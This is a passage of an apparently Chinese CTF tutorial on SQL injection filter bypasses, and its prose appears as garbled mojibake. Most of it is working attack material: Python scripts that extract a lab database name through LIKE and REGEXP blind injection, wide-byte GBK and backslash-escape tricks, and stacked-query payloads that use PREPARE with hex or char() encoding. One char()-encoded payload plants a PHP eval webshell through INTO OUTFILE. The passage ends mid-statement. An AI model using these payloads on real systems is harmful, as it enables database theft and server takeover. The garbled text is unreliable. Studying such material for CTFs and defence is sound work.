<h5 id="LIKE-æ³¨å…¥"><a href="#LIKE-æ³¨å…¥" class="headerlink" title="LIKE æ³¨å…¥"></a>LIKE æ³¨å…¥</h5><p>åœ¨LIKEå­å¥ä¸­ï¼Œç™¾åˆ†æ¯”(%)é€šé…ç¬¦å…è®¸<strong>åŒ¹é…ä»»ä½•å­—ç¬¦ä¸²çš„é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</strong>ã€‚ä¸‹åˆ’çº¿ <code>_</code> é€šé…ç¬¦å…è®¸<strong>åŒ¹é…ä»»ä½•å•ä¸ªå­—ç¬¦</strong>ã€‚<strong>åŒ¹é…æˆåŠŸåˆ™è¿”å›1ï¼Œåä¹‹è¿”å›0</strong>ï¼Œå¯ç”¨äºsqlç›²æ³¨ã€‚</p>
<ol>
<li>åˆ¤æ–­æ•°æ®åº“é•¿åº¦</li>
</ol>
<p>å¯ç”¨length()å‡½æ•°ï¼Œä¹Ÿå¯ç”¨<code>_</code>ï¼Œå¦‚ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=&#x27; or database() like &#x27;________&#x27;--+  // å›æ˜¾æ­£å¸¸</span><br></pre></td></tr></table></figure>

<ol>
<li>åˆ¤æ–­æ•°æ®åº“å</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?id=&#x27; or database() like &#x27;s%&#x27; --+</span><br><span class="line">/?id=&#x27; or (select database()) like &#x27;s%&#x27; --+</span><br><span class="line">æˆ–è€…:</span><br><span class="line">/?id=&#x27; or database() like &#x27;s_______&#x27; --+</span><br><span class="line">/?id=&#x27; or (select database()) like &#x27;s_______&#x27; --+</span><br></pre></td></tr></table></figure>

<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå›æ˜¾æ­£å¸¸ï¼Œè¯´æ˜æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯sã€‚</p>
<p>ç»¼ä¸Šæ‰€è¿°ï¼Œå¾ˆæ˜æ˜¾å’Œæ™®é€šçš„å¸ƒå°”ç›²æ³¨å·®ä¸å¤šï¼Œäºæ˜¯å†™ä¸ªGETçš„äºŒåˆ†æ³•ç›²æ³¨è„šæœ¬ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># strs = string.printable</span><br><span class="line">strs = string.ascii_letters + string.digits + &#x27;_&#x27;</span><br><span class="line">url = &quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or (select database()) like &#x27;&#123;&#125;%&#x27;--+&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 40):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads = payload.format(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;#&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<h5 id="REGEXP-æ³¨å…¥"><a href="#REGEXP-æ³¨å…¥" class="headerlink" title="REGEXP æ³¨å…¥"></a>REGEXP æ³¨å…¥</h5><p>REGEXPæ³¨å…¥ï¼Œå³regexpæ­£åˆ™è¡¨è¾¾å¼æ³¨å…¥ã€‚REGEXPæ³¨å…¥ï¼Œåˆå«ç›²æ³¨å€¼æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»ã€‚åº”ç”¨åœºæ™¯å°±æ˜¯ç›²æ³¨ï¼ŒåŸç†æ˜¯ç›´æ¥æŸ¥è¯¢è‡ªå·±éœ€è¦çš„æ•°æ®ï¼Œç„¶åé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ã€‚</p>
<ol>
<li>åˆ¤æ–­æ•°æ®åº“é•¿åº¦</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=&#x27; or (length(database())) regexp 8 --+  // å›æ˜¾æ­£å¸¸</span><br></pre></td></tr></table></figure>

<ol>
<li>åˆ¤æ–­æ•°æ®åº“å</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?id=&#x27; or database() regexp &#x27;^s&#x27;--+    // å›æ˜¾æ­£å¸¸</span><br><span class="line">/?id=&#x27; or database() regexp &#x27;se&#x27;--+    // å›æ˜¾æ­£å¸¸, ä¸é€‚ç”¨^å’Œ$è¿›è¡ŒåŒ¹é…ä¹Ÿå¯ä»¥</span><br><span class="line">/?id=&#x27; or database() regexp &#x27;^sa&#x27;--+   // æŠ¥é”™</span><br><span class="line">/?id=&#x27; or database() regexp &#x27;y$&#x27;--+    // å›æ˜¾æ­£å¸¸</span><br></pre></td></tr></table></figure>

<p>è„šæœ¬ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># strs = string.printable</span><br><span class="line">strs = string.ascii_letters + string.digits + &#x27;_&#x27;</span><br><span class="line">url = &quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or (select database()) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 40):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads = payload.format(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;#&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šè„šæœ¬éƒ½è¦æ³¨æ„æ˜¯æŒæ¡ç¼–å†™æ€è·¯ï¼Œä¸æ˜¯å¹²æŠ„è„šæœ¬ã€‚</p>
<h4 id="è¿‡æ»¤å¼•å·ç»•è¿‡"><a href="#è¿‡æ»¤å¼•å·ç»•è¿‡" class="headerlink" title="è¿‡æ»¤å¼•å·ç»•è¿‡"></a>è¿‡æ»¤å¼•å·ç»•è¿‡</h4><h5 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h5><h6 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h6><p><strong>magic_quotes_gpc</strong> ï¼ˆé­”æœ¯å¼•å·å¼€å…³ï¼‰</p>
<p><code>magic_quotes_gpc</code>å‡½æ•°åœ¨phpä¸­çš„ä½œç”¨æ˜¯åˆ¤æ–­è§£æç”¨æˆ·æäº¤çš„æ•°æ®ï¼Œå¦‚åŒ…æ‹¬æœ‰ï¼špostã€getã€cookieè¿‡æ¥çš„æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦â€œ\â€ï¼Œä»¥ç¡®ä¿è¿™äº›æ•°æ®ä¸ä¼šå¼•èµ·ç¨‹åºï¼Œç‰¹åˆ«æ˜¯æ•°æ®åº“è¯­å¥å› ä¸ºç‰¹æ®Šå­—ç¬¦å¼•èµ·çš„æ±¡æŸ“è€Œå‡ºç°è‡´å‘½çš„é”™è¯¯ã€‚</p>
<p>å•å¼•å·ï¼ˆâ€™ï¼‰ã€åŒå¼•å·ï¼ˆâ€ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ç­‰å­—ç¬¦éƒ½ä¼šè¢«åŠ ä¸Šåæ–œçº¿ï¼Œæˆ‘ä»¬è¾“å…¥çš„ä¸œè¥¿å¦‚æœä¸èƒ½é—­åˆï¼Œé‚£æˆ‘ä»¬çš„è¾“å…¥å°±ä¸ä¼šå½“ä½œä»£ç æ‰§è¡Œï¼Œå°±æ— æ³•äº§ç”ŸSQLæ³¨å…¥ã€‚</p>
<p><strong>addslashes()å‡½æ•°</strong></p>
<p>è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²</p>
<blockquote>
<p>é¢„å®šä¹‰å­—ç¬¦ï¼šå•å¼•å·ï¼ˆâ€™ï¼‰ï¼ŒåŒå¼•å·ï¼ˆâ€ï¼‰ï¼Œåæ–œæ ï¼ˆ\ï¼‰ï¼ŒNULL</p>
</blockquote>
<h6 id="å®½å­—èŠ‚æ¦‚å¿µï¼š"><a href="#å®½å­—èŠ‚æ¦‚å¿µï¼š" class="headerlink" title="å®½å­—èŠ‚æ¦‚å¿µï¼š"></a>å®½å­—èŠ‚æ¦‚å¿µï¼š</h6><ol>
<li>å•å­—èŠ‚å­—ç¬¦é›†ï¼šæ‰€æœ‰çš„å­—ç¬¦éƒ½ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºï¼Œæ¯”å¦‚ ASCII ç¼–ç (0-127)</li>
<li>å¤šå­—èŠ‚å­—ç¬¦é›†ï¼šåœ¨å¤šå­—èŠ‚å­—ç¬¦é›†ä¸­ï¼Œä¸€éƒ¨åˆ†å­—èŠ‚ç”¨å¤šä¸ªå­—èŠ‚æ¥è¡¨ç¤ºï¼Œå¦ä¸€éƒ¨åˆ†ï¼ˆå¯èƒ½æ²¡æœ‰ï¼‰ç”¨å•ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºã€‚</li>
<li>UTF-8 ç¼–ç ï¼š æ˜¯ä¸€ç§ç¼–ç çš„ç¼–ç æ–¹å¼ï¼ˆå¤šå­—èŠ‚ç¼–ç ï¼‰ï¼Œå®ƒå¯ä»¥ä½¿ç”¨1~4ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªç¬¦å·ï¼Œæ ¹æ®ä¸åŒçš„ç¬¦å·è€Œå˜åŒ–å­—èŠ‚é•¿åº¦ã€‚</li>
<li>å¸¸è§çš„å®½å­—èŠ‚ï¼š GB2312ã€GBKã€GB18030ã€BIG5ã€Shift_JIS GB2312 ä¸å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ï¼Œå¯ä»¥æ”¶é›†å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥çš„ç¼–ç ã€‚</li>
<li>å®½å­—èŠ‚æ³¨å…¥æ—¶åˆ©ç”¨mysqlçš„ä¸€ä¸ªç‰¹æ€§ï¼Œä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—</li>
</ol>
<h6 id="æˆå› ä¸ç¤ºä¾‹"><a href="#æˆå› ä¸ç¤ºä¾‹" class="headerlink" title="æˆå› ä¸ç¤ºä¾‹"></a>æˆå› ä¸ç¤ºä¾‹</h6><p>å‰é¢è®²åˆ°äº†GBKç¼–ç æ ¼å¼ã€‚GBKæ˜¯åŒå­—ç¬¦ç¼–ç ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆä»–ä»¬ä¼šå’Œæ¸—é€æµ‹è¯•å‘é€äº†â€œå·§é‡â€å‘¢ï¼Ÿ</p>
<p><strong>å®½å­—èŠ‚SQLæ³¨å…¥ä¸»è¦æ˜¯æºäºç¨‹åºå‘˜è®¾ç½®æ•°æ®åº“ç¼–ç ä¸ºéè‹±æ–‡ç¼–ç é‚£ä¹ˆå°±æœ‰å¯èƒ½äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥ã€‚</strong></p>
<p>ä¾‹å¦‚è¯´MySqlçš„ç¼–ç è®¾ç½®ä¸ºäº†SET NAMES â€˜gbkâ€™æˆ–æ˜¯ SET character_set_client &#x3D;gbkï¼Œè¿™æ ·é…ç½®ä¼šå¼•å‘ç¼–ç è½¬æ¢ä»è€Œå¯¼è‡´çš„æ³¨å…¥æ¼æ´ã€‚</p>
<p><strong>å®½å­—èŠ‚SQLæ³¨å…¥çš„æ ¹æœ¬åŸå› :</strong></p>
<p><strong>å®½å­—èŠ‚SQLæ³¨å…¥å°±æ˜¯PHPå‘é€è¯·æ±‚åˆ°MySqlæ—¶ä½¿ç”¨äº†è¯­å¥</strong></p>
<p><strong>SET NAMES â€˜gbkâ€™ æˆ–æ˜¯SET character_set_client &#x3D;gbk è¿›è¡Œäº†ä¸€æ¬¡ç¼–ç ï¼Œä½†æ˜¯åˆç”±äºä¸€äº›ä¸ç»æ„çš„å­—ç¬¦é›†è½¬æ¢å¯¼è‡´äº†å®½å­—èŠ‚æ³¨å…¥ã€‚</strong></p>
<p><strong>magic_quotes_gpcçš„ä½œç”¨ï¼šå½“PHPçš„ä¼ å‚ä¸­æœ‰ç‰¹æ®Šå­—ç¬¦å°±ä¼šåœ¨å‰é¢åŠ è½¬ä¹‰å­—ç¬¦â€™&#39;,æ¥åšä¸€å®šçš„è¿‡æ»¤</strong></p>
<p>ä¸ºäº†ç»•è¿‡magic_quotes_gpcçš„,äºæ˜¯ä¹æˆ‘ä»¬å¼€å§‹å¯¼å…¥å®½å­—èŠ‚çš„æ¦‚å¿µ</p>
<p>æˆ‘ä»¬å‘ç°\çš„ç¼–ç æ˜¯%5cï¼Œç„¶åæˆ‘ä»¬ä¼šæƒ³åˆ°ä¼ å‚ä¸€ä¸ªå­—ç¬¦æƒ³åŠæ³•å‡‘æˆä¸€ä¸ªgbkå­—ç¬¦,ä¾‹å¦‚ï¼šâ€˜é‹â€™å­—æ˜¯%df%5c</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1\&#x27;&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>è¿™æ¡è¯­å¥å› ä¸º\ä½¿æˆ‘ä»¬æ— æ³•å»æ³¨å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ç”¨%dfåƒåˆ°%5c,å› ä¸ºå¦‚æœç”¨GBKç¼–ç çš„è¯è¿™ä¸ªå°±æ˜¯é‹ï¼Œç„¶åæˆåŠŸç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1ï¿½\&#x27;#&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<h6 id="è™½ç„¶æ˜¯å†™åœ¨äº†è¿‡æ»¤å¼•å·çš„ä½ç½®ä½†æ˜¯å…¶å®ä¸æ­¢é€‚ç”¨äºè¿‡æ»¤å¼•å·"><a href="#è™½ç„¶æ˜¯å†™åœ¨äº†è¿‡æ»¤å¼•å·çš„ä½ç½®ä½†æ˜¯å…¶å®ä¸æ­¢é€‚ç”¨äºè¿‡æ»¤å¼•å·" class="headerlink" title="è™½ç„¶æ˜¯å†™åœ¨äº†è¿‡æ»¤å¼•å·çš„ä½ç½®ä½†æ˜¯å…¶å®ä¸æ­¢é€‚ç”¨äºè¿‡æ»¤å¼•å·"></a>è™½ç„¶æ˜¯å†™åœ¨äº†è¿‡æ»¤å¼•å·çš„ä½ç½®ä½†æ˜¯å…¶å®ä¸æ­¢é€‚ç”¨äºè¿‡æ»¤å¼•å·</h6><h5 id="ä½¿ç”¨åæ–œæ -é€ƒé€¸-Sql-è¯­å¥"><a href="#ä½¿ç”¨åæ–œæ -é€ƒé€¸-Sql-è¯­å¥" class="headerlink" title="ä½¿ç”¨åæ–œæ  \ é€ƒé€¸ Sql è¯­å¥"></a>ä½¿ç”¨åæ–œæ  \ é€ƒé€¸ Sql è¯­å¥</h5><p>å¦‚æœæ²¡æœ‰è¿‡æ»¤åæ–œæ çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åæ–œæ å°†åé¢çš„å¼•å·è½¬ä¹‰ï¼Œä»è€Œé€ƒé€¸åé¢çš„ Sql è¯­å¥ã€‚</p>
<p>å‡è®¾sqlè¯­å¥ä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username, password from users where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>

<p>å‡è®¾è¾“å…¥çš„ç”¨æˆ·åæ˜¯ <code>admin\</code>ï¼Œå¯†ç è¾“å…¥çš„æ˜¯ <code>or 1#</code> æ•´ä¸ªSQLè¯­å¥å˜æˆäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from users where username=&#x27;admin\&#x27; and password=&#x27; or 1#&#x27;</span><br></pre></td></tr></table></figure>

<p>ç”±äºå•å¼•å·è¢«è½¬ä¹‰ï¼Œ<code>and password=</code>è¿™éƒ¨åˆ†éƒ½æˆäº†usernameçš„ä¸€éƒ¨åˆ†ï¼Œå³</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27;admin\&#x27; and password=&#x27;</span><br></pre></td></tr></table></figure>

<p>è¿™æ · <code>or 1</code> å°±é€ƒé€¸å‡ºæ¥äº†ï¼Œç”±æ­¤å¯æ§ï¼Œå¯ä½œä¸ºæ³¨å…¥ç‚¹äº†ã€‚</p>
<h4 id="å †å æ³¨å…¥æ—¶åˆ©ç”¨-MySql-é¢„å¤„ç†"><a href="#å †å æ³¨å…¥æ—¶åˆ©ç”¨-MySql-é¢„å¤„ç†" class="headerlink" title="å †å æ³¨å…¥æ—¶åˆ©ç”¨ MySql é¢„å¤„ç†"></a>å †å æ³¨å…¥æ—¶åˆ©ç”¨ MySql é¢„å¤„ç†</h4><p>åœ¨é‡åˆ°å †å æ³¨å…¥æ—¶ï¼Œå¦‚æœselectã€renameã€alterå’Œhandlerç­‰è¯­å¥éƒ½è¢«è¿‡æ»¤çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<strong>MySqlé¢„å¤„ç†è¯­å¥é…åˆconcatæ‹¼æ¥</strong>æ¥æ‰§è¡Œsqlè¯­å¥æ‹¿flagã€‚</p>
<ol>
<li>PREPAREï¼šå‡†å¤‡ä¸€æ¡SQLè¯­å¥ï¼Œå¹¶åˆ†é…ç»™è¿™æ¡SQLè¯­å¥ä¸€ä¸ªåå­—(<code>hello</code>)ä¾›ä¹‹åè°ƒç”¨</li>
<li>EXECUTEï¼šæ‰§è¡Œå‘½ä»¤</li>
<li>DEALLOCATE PREPAREï¼šé‡Šæ”¾å‘½ä»¤</li>
<li>SETï¼šç”¨äºè®¾ç½®å˜é‡(<code>@a</code>)</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;sEt @a=concat(&quot;sel&quot;,&quot;ect flag from flag_here&quot;);PRepare hello from @a;execute hello;#</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¿˜ç”¨å¤§å°å†™ç®€å•ç»•äº†ä¸€ä¸‹å…¶ä»–è¿‡æ»¤</p>
<h5 id="MySql-é¢„å¤„ç†é…åˆåå…­è¿›åˆ¶ç»•è¿‡å…³é”®å­—"><a href="#MySql-é¢„å¤„ç†é…åˆåå…­è¿›åˆ¶ç»•è¿‡å…³é”®å­—" class="headerlink" title="MySql é¢„å¤„ç†é…åˆåå…­è¿›åˆ¶ç»•è¿‡å…³é”®å­—"></a>MySql é¢„å¤„ç†é…åˆåå…­è¿›åˆ¶ç»•è¿‡å…³é”®å­—</h5><p>åŸºæœ¬åŸç†å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select hex(&#x27;show databases&#x27;);</span><br><span class="line">+------------------------------+</span><br><span class="line">| hex(&#x27;show databases;&#x27;)       |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 73686F7720646174616261736573 |</span><br><span class="line">+------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set @b=0x73686F7720646174616261736573;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; prepare test from @b;</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql&gt; execute test;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| challenges         |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| security           |</span><br><span class="line">| test               |</span><br><span class="line">+--------------------+</span><br><span class="line">6 rows in set (0.02 sec)</span><br></pre></td></tr></table></figure>

<p>å³payloadç±»ä¼¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#</span><br></pre></td></tr></table></figure>

<h5 id="MySqlé¢„å¤„ç†é…åˆå­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡å…³é”®å­—"><a href="#MySqlé¢„å¤„ç†é…åˆå­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡å…³é”®å­—" class="headerlink" title="MySqlé¢„å¤„ç†é…åˆå­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡å…³é”®å­—"></a>MySqlé¢„å¤„ç†é…åˆå­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡å…³é”®å­—</h5><p>åŸç†å°±æ˜¯å€ŸåŠ©<code>char()</code>å‡½æ•°å°†asciiç è½¬åŒ–ä¸ºå­—ç¬¦ç„¶åå†ä½¿ç”¨<code>concat()</code>å‡½æ•°å°†å­—ç¬¦è¿æ¥èµ·æ¥ï¼Œæœ‰äº†å‰é¢çš„åŸºç¡€è¿™é‡Œåº”è¯¥å¾ˆå¥½ç†è§£äº†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(39),char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(119),char(104),char(111),char(97),char(109),char(105),char(93),char(41),char(59),char(63),char(62),char(39),char(32),char(105),char(110),char(116),char(111),char(32),char(111),char(117),char(116),char(102),char(105),char(108),char(101),char(32),char(39),char(47),char(118),char(97),char(114),char(47),char(119),char(119),char(119),char(47),char(104),char(116),char(109),char(108),char(47),char(102),char(97),char(118),char(105),char(99),char(111),char(110),char(47),char(115),char(104),char(101),char(108),char(108),char(46),char(112),char(104),char(112),char(39),char(59));prepare s1 from @sql;execute s1;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥ä¸ç”¨concatå‡½æ•°ï¼Œç›´æ¥ç”¨charå‡½æ•°ä¹Ÿå…·æœ‰è¿æ¥åŠŸèƒ½ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,119,104,111,97,109,105,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare s1 from @sql;execute s1;</span><br></pre></td></tr></table></figure>

<h4 id="è¿‡æ»¤é€—å·ç»•è¿‡"><a href="#è¿‡æ»¤é€—å·ç»•è¿‡" class="headerlink" title="è¿‡æ»¤é€—å·ç»•è¿‡"></a>è¿‡æ»¤é€—å·ç»•è¿‡</h4><p>å½“é€—å·è¢«è¿‡æ»¤äº†ä¹‹åï¼Œæˆ‘ä»¬ä¾¿ä¸èƒ½å‘ä¸‹é¢è¿™æ ·æ­£å¸¸çš„æ—¶å€™substr()å‡½æ•°å’Œlimitè¯­å¥äº†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr((select database()),1,1);</span><br><span class="line">select * from users limit 0,1;</span><br></pre></td></tr></table></figure>

<h5 id="ä½¿ç”¨fromâ€¦forâ€¦ç»•è¿‡"><a href="#ä½¿ç”¨fromâ€¦forâ€¦ç»•è¿‡" class="headerlink" title="ä½¿ç”¨fromâ€¦forâ€¦ç»•è¿‡"></a>ä½¿ç”¨fromâ€¦forâ€¦ç»•è¿‡</h5><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>from...for..</code> è¯­å¥æ›¿æ¢ substr() å‡½æ•°é‡Œçš„ <code>,1,1</code>ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">select substr((select database()) from 1 for 1);</span><br><span class="line"># æ­¤æ—¶ from 1 for 1 ä¸­çš„ä¸¤ä¸ª1åˆ†åˆ«ä»£æ›¿ substr() å‡½æ•°é‡Œçš„ä¸¤ä¸ª1</span><br><span class="line"></span><br><span class="line">select substr((select database()) from 1 for 1);    # s</span><br><span class="line">select substr((select database()) from 2 for 1);    # e</span><br><span class="line">select substr((select database()) from 3 for 1);    # c</span><br><span class="line">select substr((select database()) from 4 for 1);    # u</span><br><span class="line">select substr((select database()) from 5 for 1);    # r</span><br><span class="line">select substr((select database()) from 6 for 1);    # i</span><br><span class="line">select substr((select database()) from 7 for 1);    # t</span><br><span class="line">select substr((select database()) from 8 for 1);    # y</span><br><span class="line"></span><br><span class="line"># å¦‚æœè¿‡æ»¤äº†ç©ºæ ¼, åˆ™å¯ä»¥ä½¿ç”¨æ‹¬å·æ¥ä»£æ›¿ç©ºæ ¼:</span><br><span class="line">select substr((select database())from(1)for(1));    # s</span><br><span class="line">select substr((select database())from(2)for(1));    # e</span><br><span class="line">select substr((select database())from(3)for(1));    # c</span><br><span class="line">select substr((select database())from(4)for(1));    # u</span><br><span class="line">select substr((select database())from(5)for(1));    # r</span><br><span class="line">select substr((select database())from(6)for(1));    # i</span><br><span class="line">select substr((select 